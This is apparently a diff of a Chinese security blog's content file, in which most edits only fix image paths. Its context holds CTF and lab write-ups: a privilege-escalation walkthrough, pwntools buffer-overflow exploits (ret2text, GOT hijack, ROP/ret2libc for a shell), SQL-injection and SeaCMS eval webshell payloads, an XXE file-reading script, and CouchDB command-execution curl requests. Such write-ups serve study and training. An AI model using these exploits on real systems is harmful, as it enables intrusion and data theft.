+<h5 id="查看源代码发现有一张图片，下载到本地，有可能使用了隐写术"><a href="#查看源代码发现有一张图片，下载到本地，有可能使用了隐写术" class="headerlink" title="查看源代码发现有一张图片，下载到本地，有可能使用了隐写术"></a>查看源代码发现有一张图片，下载到本地，有可能使用了隐写术</h5><p><img src="/2019/03/20/unknowndevice/%5Cimages%5Cunknowndevice%5C5.jpg" alt="5"></p>
 <h5 id="使用steghide破解图片中隐藏的信息"><a href="#使用steghide破解图片中隐藏的信息" class="headerlink" title="使用steghide破解图片中隐藏的信息"></a>使用steghide破解图片中隐藏的信息</h5><p><code>steghide extract -sf key_is_h1dd3n.jpg</code></p>
 <p>刚刚得到字符串作为密码</p>
-<p><img src="%5Cimages%5Cunknowndevice%5C6.jpg" alt="6"></p>
+<p><img src="/2019/03/20/unknowndevice/%5Cimages%5Cunknowndevice%5C6.jpg" alt="6"></p>
 <p>解密出一串Brainfuck编码的字符串</p>
-<p><img src="%5Cimages%5Cunknowndevice%5C7.jpg" alt="7"></p>
+<p><img src="/2019/03/20/unknowndevice/%5Cimages%5Cunknowndevice%5C7.jpg" alt="7"></p>
 <p>解码得到 <strong>ud64:1M!#64@ud</strong>，看起来像用户名和密码</p>
 <h5 id="试试在1337端口上使用SSH连接"><a href="#试试在1337端口上使用SSH连接" class="headerlink" title="试试在1337端口上使用SSH连接"></a>试试在1337端口上使用SSH连接</h5><p><code>ssh ud64@192.168.2.137 -p 1337</code></p>
 <p>连接上后发现这是一个受限制的shell，PATH和shell环境变量都只是只读的</p>
-<p><img src="%5Cimages%5Cunknowndevice%5C8.jpg" alt="8"></p>
+<p><img src="/2019/03/20/unknowndevice/%5Cimages%5Cunknowndevice%5C8.jpg" alt="8"></p>
 <p>按Tab键后发现我们可以使用vim编辑器</p>
-<p><img src="%5Cimages%5Cunknowndevice%5C9.jpg" alt="9"></p>
+<p><img src="/2019/03/20/unknowndevice/%5Cimages%5Cunknowndevice%5C9.jpg" alt="9"></p>
 <p>在vi 编辑器中可以避开受限制的shell</p>
-<p><img src="%5Cimages%5Cunknowndevice%5C11.jpg" alt="11"></p>
-<p><img src="%5Cimages%5Cunknowndevice%5C10.jpg" alt="10"></p>
+<p><img src="/2019/03/20/unknowndevice/%5Cimages%5Cunknowndevice%5C11.jpg" alt="11"></p>
+<p><img src="/2019/03/20/unknowndevice/%5Cimages%5Cunknowndevice%5C10.jpg" alt="10"></p>
 <h5 id="现在我们将-bin-bash导出为SHELL环境变量，将-usr-bin导出为PATH环境变量"><a href="#现在我们将-bin-bash导出为SHELL环境变量，将-usr-bin导出为PATH环境变量" class="headerlink" title="现在我们将/bin/bash导出为SHELL环境变量，将/usr/bin导出为PATH环境变量"></a>现在我们将/bin/bash导出为SHELL环境变量，将/usr/bin导出为PATH环境变量</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export PATH=/usr/bin:$PATH</span><br><span class="line">export SHELL=/bin/bash:$SHELL</span><br></pre></td></tr></table></figure>
 
-<p><img src="%5Cimages%5Cunknowndevice%5C12.jpg" alt="12"></p>
+<p><img src="/2019/03/20/unknowndevice/%5Cimages%5Cunknowndevice%5C12.jpg" alt="12"></p>
 <p>我们发现可以在没有密码的情况下以root身份运行<strong>/usr/bin/sysud64</strong></p>
 <h5 id="在执行sysud64时，发现其实是在执行strace"><a href="#在执行sysud64时，发现其实是在执行strace" class="headerlink" title="在执行sysud64时，发现其实是在执行strace"></a>在执行sysud64时，发现其实是在执行strace</h5><p>可以使用sysud64以root用户的身份建立一个shell，然后切换到root目录</p>
-<p><img src="%5Cimages%5Cunknowndevice%5C13.jpg" alt="13"></p>
+<p><img src="/2019/03/20/unknowndevice/%5Cimages%5Cunknowndevice%5C13.jpg" alt="13"></p>
 <p>得到flag</p>
 <p><strong>strace命令</strong></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strace常用来跟踪进程执行时的系统调用和所接收的信号。 在Linux世界，进程不能直接访问硬件设备，当进程需要访问硬件设备(比如读取磁盘文件，接收网络数据等等)时，必须由用户态模式切换至内核态模式，通 过系统调用访问硬件设备。strace可以跟踪到一个进程产生的系统调用,包括参数，返回值，执行消耗的时间。</span><br></pre></td></tr></table></figure>
@@ -597,15 +597,15 @@
 <ul>
 <li><strong>函数调用发生和结束时调用栈的关系</strong></li>
 </ul>
-<p>函数状态主要涉及三个寄存器－－<font color=red><strong>esp，ebp，eip。</strong></font><strong>esp 用来存储函数调用栈的栈顶地址</strong>，在压栈和退栈时发生变化。<strong>ebp 用来存储当前函数状态的基地址</strong>，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。<strong>eip 用来存储即将执行的程序指令的地址</strong>，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</p>
+<p>函数状态主要涉及三个寄存器－－<font color="red"><strong>esp，ebp，eip。</strong></font><strong>esp 用来存储函数调用栈的栈顶地址</strong>，在压栈和退栈时发生变化。<strong>ebp 用来存储当前函数状态的基地址</strong>，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。<strong>eip 用来存储即将执行的程序指令的地址</strong>，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</p>
 <ul>
 <li><strong>栈溢出攻击</strong></li>
 </ul>
 <p>当函数正在执行内部指令的过程中我们无法拿到程序的控制权，只有在发生函数调用或者结束函数调用时，程序的控制权会在函数状态之间发生跳转，这时才可以通过修改函数状态来实现攻击。而控制程序执行指令最关键的寄存器就是<strong>eip</strong>，所以我们的目标就是<strong>让eip载入攻击指令的地址。</strong></p>
 <p>在退栈过程中，返回地址会被传给 <strong>eip</strong>，所以我们只需要让溢出数据用攻击指令的地址来覆盖返回地址就可以了。其次，我们可以在溢出数据内包含一段攻击指令，也可以在内存其他位置寻找可用的攻击指令。</p>
-<p><img src="%5Cimages%5CBuffer%5Cpic.jpg" alt="pic"></p>
+<p><img src="/2019/03/09/Buffer-overflow/%5Cimages%5CBuffer%5Cpic.jpg" alt="pic"></p>
 <ul>
-<li><font color=red><strong>核心目的是用攻击指令的地址来覆盖返回地址</strong></font></li>
+<li><font color="red"><strong>核心目的是用攻击指令的地址来覆盖返回地址</strong></font></li>
 </ul>
 <p>在函数调用发生时，<strong>eip</strong>会指向源程序中的某个指定的函数，没有办法通过改写返回地址来控制，但是可以将原本指定的函数在调用时替换为其他函数。</p>
 <h4 id="0x30栈溢出练习"><a href="#0x30栈溢出练习" class="headerlink" title="0x30栈溢出练习"></a>0x30栈溢出练习</h4><h5 id="–通过栈溢出，使函数返回程序中的system-函数"><a href="#–通过栈溢出，使函数返回程序中的system-函数" class="headerlink" title="–通过栈溢出，使函数返回程序中的system()函数"></a><strong>–通过栈溢出，使函数返回程序中的<code>system()</code>函数</strong></h5><p><strong>Code:</strong></p>
@@ -615,29 +615,29 @@
 <p>因为数组长度为20，但是<code>read()</code>函数读取128字节，所以存在缓冲区溢出</p>
 <p>如果利用输入的字符覆盖返回地址之前的内存，可以将恶意代码的地址覆盖到返回地址，可以执行恶意代码,利用<code>gdb</code>调试程序找到<strong>基地址与返回地址</strong>，相减可以得到需要覆盖掉的字符数.</p>
 <p>编译：<code>gcc -m32 vul.c -o vul -fno-stack-protector -no-pie</code>需要关闭栈溢出保护且PIE能使程序像共享库一样在主存任何位置装载，这需要将程序编译成位置无关，并链接为ELF共享对象。</p>
-<p><img src="%5Cimages%5CBuffer%5C11.png" alt="11"></p>
+<p><img src="/2019/03/09/Buffer-overflow/%5Cimages%5CBuffer%5C11.png" alt="11"></p>
 <p>同理可以找到返回地址：</p>
-<p><img src="%5Cimages%5CBuffer%5C2.png" alt="2"></p>
+<p><img src="/2019/03/09/Buffer-overflow/%5Cimages%5CBuffer%5C2.png" alt="2"></p>
 <p>相减就可以得到需要覆盖的字符数：</p>
-<p><img src="%5Cimages%5CBuffer%5C3.png" alt="3"></p>
+<p><img src="/2019/03/09/Buffer-overflow/%5Cimages%5CBuffer%5C3.png" alt="3"></p>
 <p>将返回地址修改为<strong>system()</strong>函数的地址<a href="https://blog.csdn.net/favory/article/details/4441361" target="_blank" rel="noopener">(了解大端存储与小端存储)</a></p>
 <p><strong>payload：</strong><code>padding+address of ret</code></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">'./vul'</span>)</span><br><span class="line"><span class="comment">#io=remote('192.168.233.23',10001)  对远程利用</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">44</span>+<span class="string">'\x72\x91\x04\x08'</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>然后执行python脚本，反弹shell执行命令</p>
-<p><img src="%5Cimages%5CBuffer%5C4.png" alt="4"></p>
+<p><img src="/2019/03/09/Buffer-overflow/%5Cimages%5CBuffer%5C4.png" alt="4"></p>
 <h5 id="–修改某个被调用函数的地址，让其指向另一个函数（hijack-GOT）"><a href="#–修改某个被调用函数的地址，让其指向另一个函数（hijack-GOT）" class="headerlink" title="–修改某个被调用函数的地址，让其指向另一个函数（hijack GOT）"></a><strong>–修改某个被调用函数的地址，让其指向另一个函数</strong>（<strong>hijack GOT</strong>）</h5><ul>
 <li><strong>PLT表和GOT表</strong></li>
 </ul>
 <p>程序对外部函数的调用需要在生成可执行文件时将外部函数链接到程序中，链接的方式分为静态链接和动态链接。静态链接得到的可执行文件包含外部函数的全部代码，动态链接得到的可执行文件并不包含外部函数的代码，而是在运行时将动态链接库（若干外部函数的集合）加载到内存的某个位置，再在发生调用时去链接库定位所需的函数。</p>
-<p>程序在链接库内定位到所需函数时，这个过程需要用到两张表–<strong>PLT和GOT</strong>。<strong>GOT表（全局偏移表Global Offset Table），用来储存外部很熟在内存的确切地址。</strong>GOT存储在<font color=red><strong>数据段(Data Segment)</strong></font>，可以在程序运行中被修改。<strong>PLT表（程序链接表Procedure Linkage Table）</strong>，用来存储外部很熟的入口点<strong>（entry）</strong>，即程序到<strong>PLT</strong>这里寻找外部函数的地址。PLT存储在<font color=red><strong>代码段(Code Segment)</strong></font>内，在运行之前就已经确定且不会被修改，所以b不会知道程序运行时动态链接库被加载的确切位置。那么<strong>PLT</strong>表内存储的入口点是<strong>GOT</strong>表中对应条目的地址。</p>
-<p><img src="%5Cimages%5CBuffer%5C6.png" alt="6"></p>
+<p>程序在链接库内定位到所需函数时，这个过程需要用到两张表–<strong>PLT和GOT</strong>。<strong>GOT表（全局偏移表Global Offset Table），用来储存外部很熟在内存的确切地址。</strong>GOT存储在<font color="red"><strong>数据段(Data Segment)</strong></font>，可以在程序运行中被修改。<strong>PLT表（程序链接表Procedure Linkage Table）</strong>，用来存储外部很熟的入口点<strong>（entry）</strong>，即程序到<strong>PLT</strong>这里寻找外部函数的地址。PLT存储在<font color="red"><strong>代码段(Code Segment)</strong></font>内，在运行之前就已经确定且不会被修改，所以b不会知道程序运行时动态链接库被加载的确切位置。那么<strong>PLT</strong>表内存储的入口点是<strong>GOT</strong>表中对应条目的地址。</p>
+<p><img src="/2019/03/09/Buffer-overflow/%5Cimages%5CBuffer%5C6.png" alt="6"></p>
 <p>外部函数的内存地址存储在 <strong>GOT</strong> 而非 <strong>PLT</strong> 表内，<strong>PLT</strong> 存储的入口点又指向 <strong>GOT</strong> 的对应条目。</p>
 <p><strong>GOT</strong> 表的初始值都指向 <strong>PLT</strong> 表对应条目中的某个片段，这个片段的作用是调用一个函数地址解析函数。当程序需要调用某个外部函数时，首先到 <strong>PLT</strong> 表内寻找对应的入口点，跳转到 <strong>GOT</strong> 表中。如果这是第一次调用这个函数，程序会通过 <strong>GOT</strong> 表再次跳转回 <strong>PLT</strong> 表，运行地址解析程序来确定函数的确切地址，并用其覆盖掉 <strong>GOT</strong> 表的初始值，之后再执行函数调用。当再次调用这个函数时，程序仍然首先通过 <strong>PLT</strong> 表跳转到 <strong>GOT</strong> 表，此时 <strong>GOT</strong> 表已经存有获取函数的内存地址，所以会直接跳转到函数所在地址执行函数。</p>
 <p><strong>第一次调用函数时解析函数地址并存入GOT表</strong></p>
-<p><img src="%5Cimages%5CBuffer%5C7.png" alt="7"></p>
+<p><img src="/2019/03/09/Buffer-overflow/%5Cimages%5CBuffer%5C7.png" alt="7"></p>
 <p><strong>再次调用函数时直接读取GOT内的地址</strong></p>
-<p><img src="%5Cimages%5CBuffer%5C8.png" alt="8"></p>
+<p><img src="/2019/03/09/Buffer-overflow/%5Cimages%5CBuffer%5C8.png" alt="8"></p>
 <p>如果实现函数的伪装，那就是到 <strong>GOT</strong> 表中将函数 A 的地址修改为函数 B 的地址。这样在后面所有对函数 A 的调用都会执行函数 B。</p>
 <p>即确定函数 A 在 GOT 表中的条目位置，确定函数 B 在内存中的地址，将函数 B 的地址写入函数 A 在 GOT 表中的条目。</p>
 <p><strong>Code:</strong></p>
@@ -646,11 +646,11 @@
 
 
 <p><strong>payload：</strong><code>padding+address of read_plt+address of read_plt+parameter of read(0,address of read_got,4)</code></p>
-<p><img src="%5Cimages%5CBuffer%5C9.png" alt="9"></p>
+<p><img src="/2019/03/09/Buffer-overflow/%5Cimages%5CBuffer%5C9.png" alt="9"></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">'./vul'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">44</span>+<span class="string">'\x30\x90\x04\x08'</span>+<span class="string">'\x30\x90\x04\x08'</span>+<span class="string">'\x00\x00\x00\x00'</span>+<span class="string">'\x0c\xc0\x04\x08'</span>+<span class="string">'\x04\x00\x00\x00'</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(<span class="string">'\x72\x91\x04\x08'</span>) <span class="comment">#address of shell</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <p><strong>执行payload，反弹shell</strong></p>
-<p><img src="%5Cimages%5CBuffer%5C10.png" alt="10"></p>
+<p><img src="/2019/03/09/Buffer-overflow/%5Cimages%5CBuffer%5C10.png" alt="10"></p>
 <h5 id="–修改返回地址，让其指向溢出数据中的一段指令（shellcode）"><a href="#–修改返回地址，让其指向溢出数据中的一段指令（shellcode）" class="headerlink" title="–修改返回地址，让其指向溢出数据中的一段指令（shellcode）"></a>–修改返回地址，让其指向溢出数据中的一段指令（<strong>shellcode</strong>）</h5><p>在溢出的数据内包含一段指令，用攻击指令的起始地址覆盖掉返回地址。攻击指令一般都是用来打开<code>shell</code>。<code>shellcode</code>可以在网上搜索</p>
 <p>前提：函数调用栈上的数据要有可执行的权限以及关闭内存布局随机化</p>
 <ul>
@@ -668,7 +668,7 @@
 
 
 <h5 id="–修改返回地址，让其指向内存中已有的某个函数（return2libc）"><a href="#–修改返回地址，让其指向内存中已有的某个函数（return2libc）" class="headerlink" title="–修改返回地址，让其指向内存中已有的某个函数（return2libc）"></a>–修改返回地址，让其指向内存中已有的某个函数（<strong>return2libc</strong>）</h5><p>在内存中确定某个函数的地址，并用其覆盖掉返回地址。由于<strong>libc</strong>动态链接库中的函数被广泛使用，所以有很大概率可以在内存中找到该动态库。同时由于该库包含了一些系统级的函数（例如<strong>system()</strong>等），所以通常使用这些系统级函数来获得当前进程的控制权。鉴于要执行的函数可能需要参数，比如调用 <strong>system()</strong> 函数打开 <strong>shell</strong> 的完整形式为 <strong>system(“/bin/sh”)</strong> ，所以溢出数据也要包括必要的参数。</p>
-<p><img src="%5Cimages%5CBuffer%5C12.png" alt="12"></p>
+<p><img src="/2019/03/09/Buffer-overflow/%5Cimages%5CBuffer%5C12.png" alt="12"></p>
 <ul>
 <li><strong>system()函数的地址</strong></li>
 </ul>
@@ -691,7 +691,7 @@
 <h5 id="－－修改返回地址，让其指向内存中已有的一段指令-–ROP-Return-Oriented-Programming"><a href="#－－修改返回地址，让其指向内存中已有的一段指令-–ROP-Return-Oriented-Programming" class="headerlink" title="－－修改返回地址，让其指向内存中已有的一段指令 –ROP ( Return Oriented Programming )"></a>－－修改返回地址，让其指向内存中已有的一段指令 –<strong>ROP ( Return Oriented Programming )</strong></h5><p>在64位程序中局部变量存储在栈中，函数的参数存储在寄存器中，无法通过代码来修改寄存器中的参数，但是可以通过指令去修改。</p>
 <p>在内存中确定某段指令的地址，并用其覆盖返回地址。但是有时候目标函数在内存中无法找到特定的函数可以适配，这时需要在内存中寻找多个指令片段，拼凑处一系列操作。可以使用<strong>rp++</strong>来搜索以ret结尾的指令片段。</p>
 <p><code>rp++ -f vul64 -r 5</code></p>
-<p><img src="%5Cimages%5CBuffer%5C5.png" alt="5"></p>
+<p><img src="/2019/03/09/Buffer-overflow/%5Cimages%5CBuffer%5C5.png" alt="5"></p>
 <p><strong>payload:</strong></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./vul64"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./vul64"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc64.so.6"</span>)</span><br><span class="line"><span class="comment">#io = remote('127.0.0.1', 10001)</span></span><br><span class="line">read_plt = elf.plt[<span class="string">"read"</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi_ret =<span class="number">0x0400623</span> <span class="comment">#:pop rdi ; ret  ;  (1 found)</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x00400621</span> <span class="comment">#: pop rsi ; pop r15 ; ret  ;  (1 found)</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">"a"</span>*<span class="number">40</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_r15_ret)</span><br><span class="line">payload += p64(elf.got[<span class="string">"read"</span>])</span><br><span class="line">payload += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)</span><br><span class="line">payload += p64(write_plt)</span><br><span class="line">payload += p64(elf.symbols[<span class="string">"vul"</span>])</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recv(<span class="number">128</span>)</span><br><span class="line">ret = io.recv(<span class="number">8</span>)</span><br><span class="line">read_addr = u64(ret)</span><br><span class="line"></span><br><span class="line">read_offset = libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">binsh_offset = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base = read_addr - read_offset</span><br><span class="line">system_addr = base + system_offset</span><br><span class="line">binsh_addr = base + binsh_offset</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">"a"</span> * <span class="number">40</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -716,12 +716,12 @@
 </ul>
 <p>扫描器扫描的结果为</p>
 <a id="more"></a>
-<p><img src="%5Cimages%5C%E9%83%A8%E5%88%86CTF_1%5C1.png" alt="1"></p>
+<p><img src="/2019/01/17/%E9%83%A8%E5%88%86CTF%E6%80%9D%E8%B7%AF/%5Cimages%5C%E9%83%A8%E5%88%86CTF_1%5C1.png" alt="1"></p>
 <p>在抓包时也没有发生跳转</p>
-<p><img src="%5Cimages%5C%E9%83%A8%E5%88%86CTF_1%5C2.png" alt="2"></p>
+<p><img src="/2019/01/17/%E9%83%A8%E5%88%86CTF%E6%80%9D%E8%B7%AF/%5Cimages%5C%E9%83%A8%E5%88%86CTF_1%5C2.png" alt="2"></p>
 <p>但是注意到Cookie中有一段字符串：<code>Zjo1OiJ0aHJmZyI7</code>，尝试下Base64得到<code>f:5:&quot;thrfg&quot;;</code></p>
 <p>然后再次尝试Rot13解密发现<code>thrfg</code>是<strong>gues</strong>t的Rot13,所以这下就可以试着将<strong>guest</strong>换成<strong>admin</strong>然后更改Cookie得到</p>
-<p><img src="%5Cimages%5C%E9%83%A8%E5%88%86CTF_1%5C3.png" alt="3"></p>
+<p><img src="/2019/01/17/%E9%83%A8%E5%88%86CTF%E6%80%9D%E8%B7%AF/%5Cimages%5C%E9%83%A8%E5%88%86CTF_1%5C3.png" alt="3"></p>
 <p>查看源代码后看到提示：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!-- $filename = $_POST[<span class="string">'filename'</span>]; $data = $_POST[<span class="string">'data'</span>]; --&gt;</span><br></pre></td></tr></table></figure>
 
@@ -731,13 +731,13 @@
 
 <p>依然使用Burp将GET改为POST，切记加入<strong>Content-Type: application/x-www-form-urlencoded</strong></p>
 <p>最后得到</p>
-<p><img src="%5Cimages%5C%E9%83%A8%E5%88%86CTF_1%5C4.png" alt="4"></p>
+<p><img src="/2019/01/17/%E9%83%A8%E5%88%86CTF%E6%80%9D%E8%B7%AF/%5Cimages%5C%E9%83%A8%E5%88%86CTF_1%5C4.png" alt="4"></p>
 <h4 id="SQLI"><a href="#SQLI" class="headerlink" title="SQLI"></a>SQLI</h4><p>拿到题目SQLI结合用户登录界面可以想到多半是sql注入，</p>
-<p><img src="%5Cimages%5C%E9%83%A8%E5%88%86CTF_1%5C7.png" alt="7"></p>
+<p><img src="/2019/01/17/%E9%83%A8%E5%88%86CTF%E6%80%9D%E8%B7%AF/%5Cimages%5C%E9%83%A8%E5%88%86CTF_1%5C7.png" alt="7"></p>
 <p>首先尝试弱口令可以判断出用户名为admin</p>
-<p><img src="%5Cimages%5C%E9%83%A8%E5%88%86CTF_1%5C5.png" alt="5"></p>
+<p><img src="/2019/01/17/%E9%83%A8%E5%88%86CTF%E6%80%9D%E8%B7%AF/%5Cimages%5C%E9%83%A8%E5%88%86CTF_1%5C5.png" alt="5"></p>
 <p>这个时候可以使用Intruder爆破过滤掉的字符，发现当username=admin%时有报错</p>
-<p><img src="%5Cimages%5C%E9%83%A8%E5%88%86CTF_1%5C6.png" alt="6"></p>
+<p><img src="/2019/01/17/%E9%83%A8%E5%88%86CTF%E6%80%9D%E8%B7%AF/%5Cimages%5C%E9%83%A8%E5%88%86CTF_1%5C6.png" alt="6"></p>
 <p>sprintf函数出错即为<strong>sqli格式化字符串逃逸漏洞</strong>，构造</p>
 <p><code>username=admin%1$\&#39; and 1=2# 与 username=admin%1$\&#39; and 1=1#</code></p>
 <p>可见or之后的语句执行正确则回显“password error！”，若错误则回显“username error！”所以是基于布尔的盲注</p>
@@ -750,20 +750,20 @@
 
 
 <h4 id="key又找不到了"><a href="#key又找不到了" class="headerlink" title="key又找不到了"></a>key又找不到了</h4><p>拿到题目查看网页源码发现提示</p>
-<p><img src="%5Cimages%5C%E9%83%A8%E5%88%86CTF_1%5C8.png" alt="8"></p>
+<p><img src="/2019/01/17/%E9%83%A8%E5%88%86CTF%E6%80%9D%E8%B7%AF/%5Cimages%5C%E9%83%A8%E5%88%86CTF_1%5C8.png" alt="8"></p>
 <p>访问/search_key.php时跳转到另一个网页，说明有重定向，于是用burp抓包，在get时传递参数</p>
-<p><font color=red><strong>allow_redirects=False</strong></font></p>
+<p><font color="red"><strong>allow_redirects=False</strong></font></p>
 <p>得到</p>
-<p><img src="%5Cimages%5C%E9%83%A8%E5%88%86CTF_1%5C9.png" alt="9"></p>
+<p><img src="/2019/01/17/%E9%83%A8%E5%88%86CTF%E6%80%9D%E8%B7%AF/%5Cimages%5C%E9%83%A8%E5%88%86CTF_1%5C9.png" alt="9"></p>
 <p>再次传递参数访问/key_is_here_now.php</p>
-<p><img src="%5Cimages%5C%E9%83%A8%E5%88%86CTF_1%5C10.png" alt="10"></p>
+<p><img src="/2019/01/17/%E9%83%A8%E5%88%86CTF%E6%80%9D%E8%B7%AF/%5Cimages%5C%E9%83%A8%E5%88%86CTF_1%5C10.png" alt="10"></p>
 <h4 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h4><p>这道题目给的提示是：<strong>善于查资料，你就可以拿一血了</strong>，所以很有可能是某cms的历史漏洞，去百度查询海洋CMS</p>
 <p><a href="http://0day5.com/archives/4180/" target="_blank" rel="noopener">海洋CMS V6.28代码执行0day</a></p>
 <p>按照给出的payload，直接访问<strong>url+/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[1])</strong></p>
 <p>然后用菜刀连接</p>
-<p><img src="%5Cimages%5C%E9%83%A8%E5%88%86CTF_1%5C11.png" alt="11"></p>
+<p><img src="/2019/01/17/%E9%83%A8%E5%88%86CTF%E6%80%9D%E8%B7%AF/%5Cimages%5C%E9%83%A8%E5%88%86CTF_1%5C11.png" alt="11"></p>
 <p>但是发现没有flag，但却能查到海洋cms的数据库配置文件，使用菜刀连接数据库</p>
-<p><img src="%5Cimages%5C%E9%83%A8%E5%88%86CTF_1%5C12.png" alt="12"></p>
+<p><img src="/2019/01/17/%E9%83%A8%E5%88%86CTF%E6%80%9D%E8%B7%AF/%5Cimages%5C%E9%83%A8%E5%88%86CTF_1%5C12.png" alt="12"></p>
 <p>然后右键数据库管理看到flag</p>
 ]]></content>
       <categories>
@@ -799,7 +799,7 @@
 
 <p>这一步骤将XML内容发送给服务器，当服务器将XML解析完成后，就会依照解析的内容工作，这段XML中<code>SYSTEM &quot;file:///etc/passwd&quot;</code>部分引用了目标服务器下的<code>/etc/passwd</code>文件，服务器解析XML内容后，会将这一文件内容存入<code>&amp;xxe</code>中，然后将数据返回给恶意访问者。</p>
 <p>执行完成上面的操作后，点击GO，右侧将出现此数据包的返回结果，内容如下，返回的数据为服务器上<code>/etc/passwd</code>文件的内容</p>
-<p><img src="%5Cimages%5CXML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%5C1.png" alt="1"></p>
+<p><img src="/2019/01/14/XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%5Cimages%5CXML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%5C1.png" alt="1"></p>
 <p>访问一下index.php，可以看到确实是执行了phpinfo();函数</p>
 <p><strong>利用恶意脚本：</strong></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">u'输入要读取的文件，如file:///etc/passwd'</span></span><br><span class="line"></span><br><span class="line">    payload = raw_input()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">u'输入要访问的地址，如http://172.xx.xx.xx/simplexml_load_string.php'</span></span><br><span class="line"></span><br><span class="line">    url = raw_input()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#url = 'http://192.168.1.1/simplexml_load_string.php'</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;<span class="string">'Content-type'</span>: <span class="string">'text/xml'</span>&#125;</span><br><span class="line"></span><br><span class="line">    xml = <span class="string">'&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM "'</span> + payload + <span class="string">'" &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;'</span></span><br><span class="line"></span><br><span class="line">    req = urllib2.Request(url = url,headers = headers, data = xml)</span><br><span class="line"></span><br><span class="line">    res_data = urllib2.urlopen(req)</span><br><span class="line"></span><br><span class="line">    res = res_data.read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> res</span><br></pre></td></tr></table></figure>
@@ -844,7 +844,7 @@
 
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X PUT &#39;&lt;http:&#x2F;&#x2F;192.168.199.181:5984&#x2F;teeest&#x2F;vul&gt;&#39; -d &#39;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39;  -H &quot;Cookie: AuthSession&#x3D;YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4&quot;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><figcaption><span>-X POST '<http://192.168.199.181:5984/teeest/_temp_view?limit</span></figcaption><table><tr><td class="code"><pre><span class="line">curl -X POST &#39;&lt;http:&#x2F;&#x2F;192.168.199.181:5984&#x2F;teeest&#x2F;_temp_view?limit&#x3D;11&gt;&#39; -d &#39;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#39; -H &#39;Content-Type: application&#x2F;json&#39;  -H &quot;Cookie: AuthSession&#x3D;YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4&quot;</span><br></pre></td></tr></table></figure>
